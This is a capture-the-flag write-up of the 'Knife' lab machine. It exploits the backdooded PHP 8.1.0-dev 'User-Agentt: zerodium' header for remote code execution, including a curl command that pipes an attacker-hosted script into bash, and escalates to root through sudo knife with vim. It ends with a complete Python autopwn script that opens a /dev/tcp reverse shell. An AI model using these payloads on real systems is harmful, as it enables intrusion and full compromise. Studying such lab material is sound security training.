Knife is a linux based machine that was active since May 22th of 2021 to August 28th, on this machine we will get code execution through a backdoor that was left on the PHP repository, and escalate privileges due to an executable that allows us to set our editor for editing files, so we set vim and spawn a shell.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```bash
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.242
nmap -sC -sV -p 22,80, -Pn -o scan.txt 10.10.10.242

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  1 14:22:16 2021 -- 1 IP address (1 host up) scanned in 13.13 seconds
```

We only find SSH and HTTP running, so we visite the webpage.

It looks like a site related to health, if we run `whatweb` we find something interesting.

The site uses PHP 8.1.0-**dev**, why it would use a development version?

# [](#header-1)Gaining Access

If you were up to date with the news probably you heard about this, someone left a backdoor inside the PHP repository, [here](https://unaaldia.hispasec.com/2021/03/detectada-una-puerta-trasera-en-el-repositorio-oficial-de-php.html) an article in spanish, so the backdoor works by adding the header "User-Agentt" (yes, with double "t"), and start with "zerodium", after "zerodium" string everything will be executed by php, so we test to run id command.

As we see we get back the output of the command, so we can execute a reverse shell command (we could also get the id_rsa key of james, but it's password protected, and since the server is running under james there is no difference), so we start a http server with python, and serve a bash reverse shell) so we run `curl -s http://10.10.10.242/ -H 'User-Agentt: zerodiumsystem("curl 10.10.16.34:8000/shell.sh | bash");'`, and we get a shell as james and retrieve user.txt.

# [](#header-1)Privilege Escalation

Checking if we can execute anything with sudo we see that we can run knife as root.

We check the help of the command and something quickly calls our attetion, we can specify the editor that we want to use on certain commands.

There is also a [link](https://docs.chef.io/workstation/knife/) to the documentation of the tool, then we run `sudo knife list` to see what we have available, we see /members.json, so let's try to edit it and set vim as our editor, then we can execute a shell with vim and finish with the machine: `sudo knife edit /members.json -e vim`.

# [](#header-1)Autopwn

Since the machine was really short I decided to write an autopwn for it, it uses the backdoor to spawn a reverse shell, and uses vim to escalate the privileges.

```python
#!/usr/bin/env python3

from pwn import *
import base64
import sys
import signal
import requests
import time
import threading

def def_handler(sig, fram):
    print ("Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 3:
    print ("Print please provide the IP of the target machine and the local machine")
    print ("Example usage: python3 autopwn.py 10.10.10.242 10.10.16.250")
    sys.exit(1)

ip = sys.argv[1]
local = sys.argv[2]
rev_shell = 'bash -i >& /dev/tcp/' + local + '/54321 0>&1'
encoded = base64.b64encode(rev_shell.encode("utf-8")).decode("utf-8")
p1 = log.progress("Pwning")

def log_mess(mess):
    p1.status(mess)
    time.sleep(1)
    
def spawn_shell():
    time.sleep(2)
    try:
        requests.get("http://" + ip, headers={'User-Agentt': f'zerodiumsystem("echo -n {encoded}|base64 -d|bash");'},timeout=2)
    except requests.exceptions.ReadTimeout:
        pass

log_mess("Executing reverse shell")
threading.Thread(target=spawn_shell).start()
rem = listen(54321,timeout=10)
rem.recv(1024)

log_mess("Getting user flag")
rem.send("cat /home/james/user.txt \n")
time.sleep(1)
log.success("User flag: " + rem.recv(1024).decode('utf-8').split("\n")[2])

log_mess("Escalating privileges")
rem.send("sudo knife edit /members.json -e vim\n")
time.sleep(5)
rem.recv(1024)
rem.send(":set shell=/bin/bash\n")
time.sleep(1)
rem.recv(1024)
rem.send(":shell\n")
time.sleep(1)
rem.recv(1024)
rem.send("id\n")
time.sleep(1)
log.success("We are root: " + rem.recv(1024).decode('utf-8').strip())

log_mess("Getting root flag")
rem.send("cat /root/root.txt\n")
time.sleep(1)
log.success( "Root flag: " + rem.recv(1024).decode('utf-8').strip())

p1.success("Machine owned!!")
rem.send("script -qc /bin/bash /dev/null\n")
rem.recv(1024)
rem.interactive(prompt=None)
rem.close()
```
